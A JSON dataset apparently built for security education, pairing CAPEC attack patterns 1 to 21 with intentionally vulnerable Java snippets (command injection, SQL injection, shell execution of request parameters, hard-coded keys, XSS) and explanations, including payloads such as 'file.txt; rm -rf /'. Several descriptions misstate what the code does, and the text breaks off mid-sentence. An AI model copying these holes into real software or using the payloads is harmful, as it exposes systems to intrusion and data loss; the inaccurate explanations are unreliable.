[
    {
        "capec_id": "1",
        "capec_name": "Accessing Functionality Not Properly Constrained by ACLs",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport javax.servlet.http.HttpSession;\n\n@WebServlet(\"/admin\")\npublic class AdminServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        HttpSession session = request.getSession();\n        String role = (String) session.getAttribute(\"role\");\n\n        // Improper Authorization Check\n        if (role == null || !role.equals(\"admin\")) {\n            response.sendError(HttpServletResponse.SC_FORBIDDEN, \"Access Denied\");\n            return;\n        }\n\n        // Sensitive functionality accessible without proper ACL\n        response.getWriter().println(\"Welcome to the admin panel!\");\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a common vulnerability where access to sensitive functionality is not properly constrained by Access Control Lists (ACLs). The servlet is mapped to the '/admin' URL, which should only be accessible by users with an 'admin' role. However, the authorization check is performed in a simplistic manner, and if the role attribute is not set correctly or is missing, unauthorized users could potentially access the admin panel. This represents CWE-285 (Improper Authorization) and CWE-276 (Incorrect Default Permissions) as the default permissions might allow access without proper checks. The code highlights the importance of robust access control mechanisms to prevent unauthorized access to sensitive parts of an application."
    },
    {
        "capec_id": "2",
        "capec_name": "Inducing Account Lockout",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class AccountLockout {\n    private static final int MAX_ATTEMPTS = 3;\n    private Map<String, Integer> loginAttempts = new HashMap<>();\n    private Map<String, Boolean> accountLocked = new HashMap<>();\n\n    public boolean login(String username, String password) {\n        if (accountLocked.getOrDefault(username, false)) {\n            System.out.println(\"Account is locked.\");\n            return false;\n        }\n\n        if (authenticate(username, password)) {\n            loginAttempts.put(username, 0); // Reset attempts on successful login\n            return true;\n        } else {\n            int attempts = loginAttempts.getOrDefault(username, 0) + 1;\n            loginAttempts.put(username, attempts);\n            if (attempts >= MAX_ATTEMPTS) {\n                accountLocked.put(username, true);\n                System.out.println(\"Account locked due to too many failed attempts.\");\n            }\n            return false;\n        }\n    }\n\n    private boolean authenticate(String username, String password) {\n        // Dummy authentication logic\n        return \"password123\".equals(password);\n    }\n\n    public static void main(String[] args) {\n        AccountLockout system = new AccountLockout();\n        system.login(\"user1\", \"wrongpass\");\n        system.login(\"user1\", \"wrongpass\");\n        system.login(\"user1\", \"wrongpass\");\n        system.login(\"user1\", \"password123\"); // This will fail because the account is locked\n    }\n}",
        "description": "This Java code snippet demonstrates an overly restrictive account lockout mechanism, which is the main idea of the CAPEC 'Inducing Account Lockout'. The code defines a simple login system where an account is locked after three failed login attempts. The `login` method checks if the account is locked before attempting authentication. If the authentication fails, it increments the failed attempt count and locks the account if the maximum number of attempts is reached. This mechanism can be exploited by an attacker to lock out legitimate users by repeatedly entering incorrect passwords. The code also highlights related weaknesses such as weak password requirements and improper restriction of excessive authentication attempts."
    },
    {
        "capec_id": "3",
        "capec_name": "Using Leading 'Ghost' Character Sequences to Bypass Input Filters",
        "code_snippet": "import java.util.regex.Pattern;\n\npublic class InputFilterBypass {\n    public static void main(String[] args) {\n        String userInput = \"\\u200B\\u200C\\u200D\\uFEFF<script>alert('XSS');</script>\";\n        String sanitizedInput = sanitizeInput(userInput);\n        System.out.println(\"Sanitized Input: \" + sanitizedInput);\n    }\n\n    public static String sanitizeInput(String input) {\n        // Early validation before canonicalization\n        if (!isValidInput(input)) {\n            return \"Invalid input\";\n        }\n        // Canonicalize input by removing leading ghost characters\n        String canonicalizedInput = input.replaceAll(\"^[\\u200B\\u200C\\u200D\\uFEFF]+\", \"\");\n        // Filter input\n        return canonicalizedInput.replaceAll(\"<.*?>\", \"\");\n    }\n\n    public static boolean isValidInput(String input) {\n        // Simple validation check\n        return !Pattern.compile(\"<.*?>\").matcher(input).find();\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability where leading 'ghost' characters (zero-width spaces) are used to bypass input filters. The `sanitizeInput` method first performs an early validation check to see if the input contains any HTML tags. However, this validation is done before canonicalizing the input, which involves removing the leading ghost characters. As a result, the input passes the initial validation check, and only after canonicalization are the ghost characters removed. The final filtering step then attempts to remove any HTML tags. This sequence of operations embodies the CAPEC's main idea of using leading ghost characters to bypass input filters, and it highlights related CWEs such as improper handling of alternate encoding (CWE-173), incorrect behavior order (CWE-179, CWE-180), and improper input validation (CWE-20)."
    },
    {
        "capec_id": "4",
        "capec_name": "Using Alternative IP Address Encodings",
        "code_snippet": "import java.net.InetAddress;\nimport java.net.UnknownHostException;\nimport java.util.regex.Pattern;\n\npublic class IPAddressValidator {\n    private static final Pattern IP_PATTERN = Pattern.compile(\n        \"^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\\\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$\"\n    );\n\n    public static boolean isValidIPAddress(String ip) {\n        return IP_PATTERN.matcher(ip).matches();\n    }\n\n    public static boolean isTrustedIP(String ip) {\n        if (!isValidIPAddress(ip)) {\n            return false;\n        }\n        try {\n            InetAddress inetAddress = InetAddress.getByName(ip);\n            String hostname = inetAddress.getHostName();\n            InetAddress[] addresses = InetAddress.getAllByName(hostname);\n            for (InetAddress addr : addresses) {\n                if (addr.getHostAddress().equals(ip)) {\n                    return true;\n                }\n            }\n        } catch (UnknownHostException e) {\n            e.printStackTrace();\n        }\n        return false;\n    }\n\n    public static void main(String[] args) {\n        String ip = \"192.168.1.1\";\n        if (isTrustedIP(ip)) {\n            System.out.println(\"IP is trusted.\");\n        } else {\n            System.out.println(\"IP is not trusted.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic implementation of IP address validation and trust verification. The `isValidIPAddress` method uses a regular expression to check if the input string is a valid IPv4 address. The `isTrustedIP` method first validates the IP address format and then performs a reverse DNS lookup to obtain the hostname. It subsequently resolves the hostname back to IP addresses and checks if any of these addresses match the original IP. This approach aims to mitigate issues related to CAPEC-273 (Using Alternative IP Address Encodings) by ensuring that the IP address is in a standard format and correctly associated with the hostname. The code also touches on related CWEs such as CWE-291 (Reliance on IP Address for Authentication) and CWE-350 (Reliance on Reverse DNS Resolution for a Security-Critical Action)."
    },
    {
        "capec_id": "5",
        "capec_name": "Blue Boxing",
        "code_snippet": "import java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.Scanner;\n\npublic class BlueBoxingExample {\n    public static void main(String[] args) throws IOException {\n        ServerSocket serverSocket = new ServerSocket(8080);\n        System.out.println(\"Server is listening on port 8080\");\n\n        while (true) {\n            Socket socket = serverSocket.accept();\n            System.out.println(\"New client connected\");\n\n            Scanner input = new Scanner(socket.getInputStream());\n            String message = input.nextLine();\n\n            // Vulnerable to Blue Boxing: No proper authorization or verification\n            if (message.equals(\"SUPERVISOR_TONE\")) {\n                System.out.println(\"Supervisor command received. Granting access...\");\n                // Improper Authorization (CWE-285)\n                // Improper Verification of Source (CWE-940)\n                // Improper Restriction of Communication Channel (CWE-923)\n                // Authentication Bypass by Capture-replay (CWE-294)\n                // Improper Enforcement of Message Integrity (CWE-924)\n                grantSupervisorAccess(socket);\n            } else {\n                System.out.println(\"Regular message received: \" + message);\n            }\n        }\n    }\n\n    private static void grantSupervisorAccess(Socket socket) {\n        // Granting access without proper checks\n        System.out.println(\"Access granted to: \" + socket.getInetAddress());\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified example of a Blue Boxing vulnerability. The server listens on port 8080 and accepts incoming connections. When a message 'SUPERVISOR_TONE' is received, it grants supervisor access without proper authorization or verification. This embodies the main idea of the CAPEC by showing how an attacker can send a specific tone to impersonate a supervisor signal, leading to unauthorized access. The code is vulnerable to several CWEs: Improper Authorization (CWE-285), Improper Verification of Source (CWE-940), Improper Restriction of Communication Channel (CWE-923), Authentication Bypass by Capture-replay (CWE-294), and Improper Enforcement of Message Integrity (CWE-924)."
    },
    {
        "capec_id": "6",
        "capec_name": "Argument Injection",
        "code_snippet": "import java.io.*;\n\npublic class ArgumentInjectionExample {\n    public static void main(String[] args) {\n        if (args.length < 1) {\n            System.out.println(\"Usage: java ArgumentInjectionExample <filename>\");\n            return;\n        }\n\n        String filename = args[0];\n        try {\n            // CWE-78: OS Command Injection\n            String command = \"cat \" + filename;\n            Process process = Runtime.getRuntime().exec(command);\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates an example of Argument Injection vulnerability. The program takes a filename as a command-line argument and constructs an OS command to display the contents of the file using the 'cat' command. The filename is directly concatenated into the command string without any validation or neutralization of special characters. This can lead to an OS Command Injection (CWE-78) if an attacker provides a malicious filename containing special characters or command delimiters. For example, an attacker could provide a filename like 'file.txt; rm -rf /' to execute arbitrary commands. This snippet embodies the main idea of CAPEC-138 (Argument Injection) by showing how unvalidated and unfiltered arguments can change the behavior of the application."
    },
    {
        "capec_id": "7",
        "capec_name": "Blind SQL Injection",
        "code_snippet": "import java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.ResultSet;\nimport java.sql.Statement;\nimport java.util.Scanner;\n\npublic class BlindSQLInjectionExample {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"Enter user ID: \");\n        String userId = scanner.nextLine();\n\n        try {\n            Connection connection = DriverManager.getConnection(\"jdbc:mysql://localhost:3306/mydatabase\", \"user\", \"password\");\n            Statement statement = connection.createStatement();\n\n            // Vulnerable SQL query\n            String query = \"SELECT * FROM users WHERE id = '\" + userId + \"'\";\n            ResultSet resultSet = statement.executeQuery(query);\n\n            if (resultSet.next()) {\n                System.out.println(\"User exists.\");\n            } else {\n                System.out.println(\"User does not exist.\");\n            }\n\n            resultSet.close();\n            statement.close();\n            connection.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a Blind SQL Injection vulnerability. The program prompts the user to enter a user ID, which is then directly concatenated into an SQL query without proper input validation or neutralization. This allows an attacker to input SQL commands that can manipulate the query. For example, entering '1' OR '1'='1' would always return true, potentially exposing sensitive information. The code embodies the main idea of CAPEC-89 (Blind SQL Injection) and highlights related weaknesses such as improper neutralization of special elements (CWE-89), improper input validation (CWE-20), and incorrect comparison (CWE-697)."
    },
    {
        "capec_id": "8",
        "capec_name": "Buffer Overflow in an API Call",
        "code_snippet": "import java.nio.ByteBuffer;\n\npublic class VulnerableLibrary {\n    public void vulnerableMethod(byte[] input) {\n        // CWE-120: Buffer Copy without Checking Size of Input\n        byte[] buffer = new byte[10];\n        System.arraycopy(input, 0, buffer, 0, input.length);\n    }\n\n    public static void main(String[] args) {\n        VulnerableLibrary lib = new VulnerableLibrary();\n        // Simulate an API call with a large input to trigger buffer overflow\n        byte[] largeInput = new byte[20];\n        lib.vulnerableMethod(largeInput);\n    }\n}",
        "description": "This Java code snippet demonstrates a buffer overflow vulnerability in an API call, aligning with the CAPEC description. The `vulnerableMethod` in the `VulnerableLibrary` class copies an input byte array to a fixed-size buffer without checking if the input size exceeds the buffer size (CWE-120). This can lead to a buffer overflow if the input is larger than the buffer, as shown in the `main` method where a large input is passed to the `vulnerableMethod`. This example highlights how improper handling of buffer sizes can lead to security vulnerabilities in libraries or shared code modules, affecting all clients using the vulnerable code."
    },
    {
        "capec_id": "9",
        "capec_name": "Buffer Overflow in Local Command-Line Utilities",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\n\npublic class VulnerableCommandLineUtility {\n    public static void main(String[] args) {\n        BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));\n        char[] buffer = new char[256];\n        try {\n            System.out.print(\"Enter command: \");\n            int charsRead = reader.read(buffer);\n            String command = new String(buffer, 0, charsRead);\n            Runtime.getRuntime().exec(command);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet represents a vulnerable command-line utility that reads user input and executes it as a system command. The code demonstrates several weaknesses: \n1. **Buffer Copy without Checking Size of Input (CWE-120)**: The code reads input into a fixed-size buffer without checking if the input exceeds the buffer size, leading to a potential buffer overflow.\n2. **Improper Input Validation (CWE-20)**: The code does not validate the input, allowing potentially dangerous commands to be executed.\n3. **Improper Neutralization of Special Elements in Output Used by a Downstream Component (CWE-74)**: The code directly uses user input to construct a command, which can be exploited for command injection.\n4. **Incorrect Access of Indexable Resource (CWE-118)**: The code assumes that the number of characters read will fit into the buffer, which may not always be the case.\n\nThe main idea of the CAPEC is to demonstrate how an adversary can exploit vulnerabilities in command-line utilities to escalate privileges, potentially to root. This code snippet embodies that idea by showing how improper handling of user input can lead to serious security issues."
    },
    {
        "capec_id": "10",
        "capec_name": "Buffer Overflow via Environment Variables",
        "code_snippet": "import java.util.Map;\n\npublic class VulnerableApp {\n    public static void main(String[] args) {\n        // Get environment variable\n        String userInput = System.getenv(\"USER_INPUT\");\n        \n        // Vulnerable buffer copy without checking size\n        char[] buffer = new char[10];\n        for (int i = 0; i < userInput.length(); i++) {\n            buffer[i] = userInput.charAt(i); // CWE-120: Buffer Copy without Checking Size of Input\n        }\n        \n        // Print the buffer content\n        System.out.println(buffer);\n    }\n}",
        "description": "This Java code snippet demonstrates a buffer overflow vulnerability via environment variables, aligning with the CAPEC description. The code retrieves an environment variable 'USER_INPUT' and copies its content into a fixed-size buffer without checking the input size, leading to a potential buffer overflow (CWE-120). This example highlights the implicit trust placed in environment variables and the lack of proper input validation (CWE-20), which can be exploited by an attacker to cause a buffer overflow."
    },
    {
        "capec_id": "11",
        "capec_name": "Cause Web Server Misclassification",
        "code_snippet": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class FileUploadServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        Part filePart = request.getPart(\"file\");\n        String fileName = getFileName(filePart);\n        String fileExtension = getFileExtension(fileName);\n\n        // Vulnerable: relying on file extension to determine file handling\n        if (\"txt\".equals(fileExtension)) {\n            processTextFile(filePart);\n        } else if (\"jpg\".equals(fileExtension)) {\n            processImageFile(filePart);\n        } else {\n            // Default handler\n            processDefaultFile(filePart);\n        }\n    }\n\n    private String getFileName(Part part) {\n        for (String content : part.getHeader(\"content-disposition\").split(\";\")) {\n            if (content.trim().startsWith(\"filename\")) {\n                return content.substring(content.indexOf('=') + 1).trim().replace(\"\\\"\", \"\");\n            }\n        }\n        return null;\n    }\n\n    private String getFileExtension(String fileName) {\n        if (fileName != null && fileName.contains(\".\")) {\n            return fileName.substring(fileName.lastIndexOf('.') + 1);\n        }\n        return \"\";\n    }\n\n    private void processTextFile(Part filePart) throws IOException {\n        // Process text file\n    }\n\n    private void processImageFile(Part filePart) throws IOException {\n        // Process image file\n    }\n\n    private void processDefaultFile(Part filePart) throws IOException {\n        // Process default file\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerability where the handling of uploaded files is determined based on their file extensions. The `doPost` method processes file uploads and uses the file extension to decide which handler to invoke. This approach is vulnerable because an attacker could upload a file with a misleading extension, causing the server to misclassify and improperly handle the file. This could lead to resource exhaustion, exposure of sensitive data, or execution of unintended actions. The code embodies the main idea of CAPEC-430 and related CWEs, such as CWE-646 (reliance on file name or extension) and CWE-430 (deployment of wrong handler)."
    },
    {
        "capec_id": "12",
        "capec_name": "Choosing Message Identifier",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class MessageHandler {\n    private static final Map<String, String> clientMessages = new HashMap<>();\n    private static final String SECRET_KEY = \"superSecretKey\";\n\n    public static void main(String[] args) {\n        // Simulate adding messages for clients\n        clientMessages.put(\"client1\", \"message1\");\n        clientMessages.put(\"client2\", \"message2\");\n\n        // Adversary chooses a message identifier\n        String chosenMessage = getMessageForClient(\"client1\");\n        System.out.println(\"Chosen Message: \" + chosenMessage);\n\n        // Adversary impersonates another client\n        String impersonatedMessage = impersonateClient(\"client2\", \"newMessage\");\n        System.out.println(\"Impersonated Message: \" + impersonatedMessage);\n    }\n\n    public static String getMessageForClient(String clientId) {\n        // CWE-201: Insertion of Sensitive Information Into Sent Data\n        return clientMessages.get(clientId) + \"|\" + SECRET_KEY;\n    }\n\n    public static String impersonateClient(String clientId, String newMessage) {\n        // CWE-306: Missing Authentication for Critical Function\n        clientMessages.put(clientId, newMessage);\n        return clientMessages.get(clientId);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable message handling system where an adversary can choose a message identifier to access messages intended for other clients and impersonate another client to change their message. The `getMessageForClient` method illustrates CWE-201 by including sensitive information (a secret key) in the transmitted data. The `impersonateClient` method demonstrates CWE-306 by allowing message modification without any authentication. This code embodies the main idea of the CAPEC by showing how an adversary can exploit message identifiers to gain unauthorized access and impersonate clients."
    },
    {
        "capec_id": "13",
        "capec_name": "Subverting Environment Variable Values",
        "code_snippet": "import java.io.IOException;\n\npublic class VulnerableApp {\n    public static void main(String[] args) throws IOException {\n        // CWE-15: External Control of System or Configuration Setting\n        String configPath = System.getenv(\"CONFIG_PATH\");\n        if (configPath == null) {\n            configPath = \"/default/config/path\";\n        }\n        \n        // CWE-73: External Control of File Name or Path\n        java.nio.file.Path path = java.nio.file.Paths.get(configPath);\n        java.nio.file.Files.lines(path).forEach(System.out::println);\n        \n        // CWE-302: Authentication Bypass by Assumed-Immutable Data\n        String userRole = System.getenv(\"USER_ROLE\");\n        if (\"admin\".equals(userRole)) {\n            System.out.println(\"Access granted to admin functionalities.\");\n        } else {\n            System.out.println(\"Access denied.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable application that reads configuration and user role information from environment variables. The main idea of the CAPEC is represented by the manipulation of environment variables to subvert the application's behavior. The code includes several related CWEs:\n\n1. CWE-15: External Control of System or Configuration Setting - The application reads the configuration path from an environment variable, which can be controlled by an attacker.\n2. CWE-73: External Control of File Name or Path - The application uses the externally controlled configuration path to read a file, potentially leading to unauthorized file access.\n3. CWE-302: Authentication Bypass by Assumed-Immutable Data - The application assumes the 'USER_ROLE' environment variable is immutable and uses it to grant or deny access to admin functionalities, which can be bypassed by an attacker setting this variable."
    },
    {
        "capec_id": "14",
        "capec_name": "Client-side Injection-induced Buffer Overflow",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class VulnerableClient {\n    public static void main(String[] args) {\n        try {\n            URL url = new URL(\"http://malicious.example.com\");\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"GET\");\n\n            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n            String inputLine;\n            StringBuilder response = new StringBuilder();\n\n            while ((inputLine = in.readLine()) != null) {\n                response.append(inputLine);\n            }\n            in.close();\n\n            // Vulnerable code: copying response to a fixed-size buffer without size check\n            char[] buffer = new char[50];\n            response.getChars(0, response.length(), buffer, 0);\n\n            System.out.println(buffer);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a client-side application that fetches data from a potentially malicious server. The code reads the response from the server and attempts to copy it into a fixed-size buffer without checking the size of the response. This can lead to a buffer overflow vulnerability (CWE-120, CWE-119). The code also lacks integrity checks for the data received (CWE-353) and does not validate the input properly (CWE-20). The main idea of the CAPEC is to show how a client-side buffer overflow can be induced by injecting malicious content from a hostile service."
    },
    {
        "capec_id": "15",
        "capec_name": "Command Delimiters",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class CommandInjectionExample {\n    public static void main(String[] args) {\n        try {\n            BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));\n            System.out.print(\"Enter a filename: \");\n            String filename = reader.readLine();\n\n            // Vulnerable code: concatenating user input directly into the command\n            String command = \"cat \" + filename;\n            Process process = Runtime.getRuntime().exec(command);\n\n            BufferedReader processReader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = processReader.readLine()) != null) {\n                System.out.println(line);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a command injection vulnerability. The program reads a filename from user input and directly concatenates it into a shell command (`cat <filename>`). This approach is vulnerable to command injection attacks because an attacker can input a filename containing shell command delimiters (e.g., `;`, `&&`, `|`) to execute arbitrary commands. For example, entering `file.txt; rm -rf /` would execute the `cat file.txt` command followed by the `rm -rf /` command, potentially causing significant damage. This code embodies the main idea of CAPEC-100: Command Delimiters, and highlights related CWEs such as CWE-77 (Command Injection) and CWE-78 (OS Command Injection)."
    },
    {
        "capec_id": "16",
        "capec_name": "Dictionary-based Password Attack",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\nimport java.util.Scanner;\n\npublic class DictionaryAttackExample {\n    private static Map<String, String> userDatabase = new HashMap<>();\n    private static String[] dictionary = {\"password\", \"123456\", \"qwerty\", \"abc123\", \"letmein\"};\n\n    public static void main(String[] args) {\n        // Initialize user database with weak passwords\n        userDatabase.put(\"user1\", \"password\");\n        userDatabase.put(\"user2\", \"123456\");\n\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"Enter username: \");\n        String username = scanner.nextLine();\n        System.out.print(\"Enter password: \");\n        String password = scanner.nextLine();\n\n        if (authenticate(username, password)) {\n            System.out.println(\"Access granted.\");\n        } else {\n            System.out.println(\"Access denied.\");\n        }\n    }\n\n    private static boolean authenticate(String username, String password) {\n        if (userDatabase.containsKey(username)) {\n            String storedPassword = userDatabase.get(username);\n            for (String dictWord : dictionary) {\n                if (storedPassword.equals(dictWord)) {\n                    return true;\n                }\n            }\n        }\n        return false;\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified example of a dictionary-based password attack. The code initializes a user database with weak passwords and uses a predefined dictionary of common passwords. When a user attempts to log in, the code checks if the entered password matches any of the passwords in the dictionary. If a match is found, access is granted. This example highlights several weaknesses: weak password requirements (CWE-521), reliance on single-factor authentication (CWE-308), and improper restriction of excessive authentication attempts (CWE-307). The code is vulnerable to dictionary attacks because it uses common passwords and does not implement measures to prevent multiple failed authentication attempts."
    },
    {
        "capec_id": "17",
        "capec_name": "Using Malicious Files",
        "code_snippet": "import java.io.*;\nimport java.nio.file.*;\n\npublic class MaliciousFileExample {\n    public static void main(String[] args) {\n        String uploadDir = \"/var/www/uploads/\";\n        String fileName = args[0];\n        Path filePath = Paths.get(uploadDir, fileName);\n\n        try {\n            // CWE-732: Incorrect Permission Assignment for Critical Resource\n            Files.setPosixFilePermissions(filePath, PosixFilePermissions.fromString(\"rwxrwxrwx\"));\n\n            // CWE-285: Improper Authorization\n            if (!isAuthorizedUser()) {\n                throw new SecurityException(\"User not authorized to upload files.\");\n            }\n\n            // CWE-272: Least Privilege Violation\n            dropPrivileges();\n\n            // CWE-59: Improper Link Resolution Before File Access\n            if (Files.isSymbolicLink(filePath)) {\n                throw new IOException(\"Symbolic links are not allowed.\");\n            }\n\n            // CWE-282: Improper Ownership Management\n            Files.setOwner(filePath, FileSystems.getDefault().getUserPrincipalLookupService().lookupPrincipalByName(\"www-data\"));\n\n            // CWE-270: Privilege Context Switching Error\n            switchPrivileges();\n\n            // CWE-693: Protection Mechanism Failure\n            if (!isValidFile(filePath)) {\n                throw new SecurityException(\"Invalid file detected.\");\n            }\n\n            // Execute the uploaded file (vulnerable action)\n            Runtime.getRuntime().exec(filePath.toString());\n        } catch (IOException | SecurityException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static boolean isAuthorizedUser() {\n        // Dummy authorization check\n        return true;\n    }\n\n    private static void dropPrivileges() {\n        // Dummy method to drop privileges\n    }\n\n    private static void switchPrivileges() {\n        // Dummy method to switch privileges\n    }\n\n    private static boolean isValidFile(Path filePath) {\n        // Dummy file validation\n        return true;\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where a web server allows file uploads and then executes the uploaded file. The code includes several security weaknesses: incorrect permission assignment (CWE-732), improper authorization (CWE-285), least privilege violation (CWE-272), improper link resolution (CWE-59), improper ownership management (CWE-282), privilege context switching error (CWE-270), and protection mechanism failure (CWE-693). The main idea is to show how an attacker could exploit these weaknesses to upload and execute a malicious file, highlighting the importance of proper security measures in file handling and execution."
    },
    {
        "capec_id": "18",
        "capec_name": "XSS Targeting Non-Script Elements",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userComment = request.getParameter(\"comment\");\n        response.setContentType(\"text/html\");\n        response.getWriter().println(\"<html><body>\");\n        response.getWriter().println(\"<h1>User Comment</h1>\");\n        response.getWriter().println(\"<img src='\" + userComment + \"' />\");\n        response.getWriter().println(\"</body></html>\");\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerability where user input is directly embedded into an IMG tag's src attribute without proper sanitization. The 'userComment' parameter is taken from the HTTP request and inserted into the HTML response. If an attacker provides a malicious script as the 'comment' parameter, it could lead to an XSS attack. This example embodies the CAPEC 'XSS Targeting Non-Script Elements' by showing how improper neutralization of input in non-script elements (like IMG tags) can be exploited. The related CWEs highlight the lack of proper input validation and neutralization, making the application susceptible to XSS attacks."
    },
    {
        "capec_id": "19",
        "capec_name": "Embedding Scripts within Scripts",
        "code_snippet": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String script = request.getParameter(\"script\");\n        if (script != null) {\n            try {\n                ProcessBuilder pb = new ProcessBuilder(\"/bin/sh\", \"-c\", script);\n                Process p = pb.start();\n                BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    response.getWriter().println(line);\n                }\n            } catch (IOException e) {\n                response.getWriter().println(\"Error executing script\");\n            }\n        } else {\n            response.getWriter().println(\"No script provided\");\n        }\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerability where an attacker can embed and execute their own script within the server's script execution context. The servlet takes a 'script' parameter from the HTTP request and executes it using a shell command. This represents the CAPEC 'Embedding Scripts within Scripts' and is related to several CWEs: CWE-284 (Improper Access Control) as it does not restrict script execution to authorized users, CWE-79 (Cross-site Scripting) as it can potentially output untrusted data, CWE-830 (Inclusion of Web Functionality from an Untrusted Source) as it executes untrusted scripts, and CWE-506 (Embedded Malicious Code) as it allows execution of potentially malicious code."
    },
    {
        "capec_id": "20",
        "capec_name": "Encryption Brute Forcing",
        "code_snippet": "import javax.crypto.Cipher;\nimport javax.crypto.spec.SecretKeySpec;\nimport java.util.Base64;\n\npublic class WeakEncryptionExample {\n    private static final String ALGORITHM = \"AES\";\n    private static final String HARD_CODED_KEY = \"1234567890123456\"; // CWE-321\n\n    public static void main(String[] args) {\n        try {\n            String plaintext = \"SensitiveData\";\n            String encrypted = encrypt(plaintext, HARD_CODED_KEY);\n            System.out.println(\"Encrypted: \" + encrypted);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static String encrypt(String data, String key) throws Exception {\n        SecretKeySpec secretKey = new SecretKeySpec(key.getBytes(), ALGORITHM);\n        Cipher cipher = Cipher.getInstance(ALGORITHM);\n        cipher.init(Cipher.ENCRYPT_MODE, secretKey);\n        byte[] encryptedBytes = cipher.doFinal(data.getBytes());\n        return Base64.getEncoder().encodeToString(encryptedBytes);\n    }\n}",
        "description": "This Java code snippet demonstrates a weak encryption implementation that is vulnerable to brute force attacks. The code uses a hard-coded cryptographic key (CWE-321), which significantly increases the risk of the key being discovered through brute force methods. The encryption algorithm used is AES, but the strength of the encryption is compromised due to the use of a predictable and static key. This example embodies the main idea of CAPEC-116 (Encryption Brute Forcing) by showing how an attacker, armed with the cipher text and knowledge of the encryption algorithm, could perform an exhaustive search on the key space to determine the key and decrypt the cipher text."
    },
    {
        "capec_id": "21",
        "capec_name": "Exploitation of Trusted Identifiers",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String sessionId = request.getParameter(\"sessionId\");\n        HttpSession session = request.getSession(false);\n        if (session == null || !session.getId().equals(sessionId)) {\n            response.sendError(HttpServletResponse.SC_UNAUTHORIZED, \"Invalid session\");\n            return;\n        }\n        // Perform actions as authenticated user\n        response.getWriter().println(\"Welcome, user!\");\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerability related to the 'Exploitation of Trusted Identifiers' CAPEC. The code retrieves a session ID from a request parameter and compares it to the current session ID without proper validation. This can lead to several issues described by the related CWEs:\n\n1. **CWE-290 (Authentication Bypass by Spoofing)**: An attacker can guess or obtain a valid session ID and use it to bypass authentication.\n2. **CWE-302 (Authentication Bypass by Assumed-Immutable Data)**: The session ID is assumed to be immutable and trusted, but it can be manipulated by an attacker.\n3. **CWE-346 (Origin Validation Error)**: The code does not properly verify the source of the session ID.\n4. **CWE-539 (Use of Persistent Cookies Containing Sensitive Information)**: If the session ID is stored in a persistent cookie, it can be stolen and reused by an attacker.\n5. **CWE-384 (Session Fixation)**: The code does not invalidate the session ID upon authentication, allowing an attacker to fixate a session.\n6. **CWE-602 (Client-Side Enforcement of Server-Side Security)**: The server relies on the client to provide a valid session ID, which can be manipulated.\n7. **CWE-642 (External Control of Critical State Data)**: The session ID, a critical piece of state data, is controlled externally by the client.\n\nThis code snippet highlights the importance of 